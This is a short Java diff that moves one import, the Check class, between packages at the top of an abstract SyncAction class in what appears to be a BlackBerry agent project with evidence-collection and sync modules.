@@ -18,12 +18,12 @@ import blackberry.action.sync.protocol.ProtocolException;
 import blackberry.action.sync.protocol.ZProtocol;
 import blackberry.action.sync.transport.Transport;
 import blackberry.agent.Agent;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceCollector;
-import blackberry.utils.Check;
 
 public abstract class SyncAction extends SubAction {
     protected EvidenceCollector logCollector;
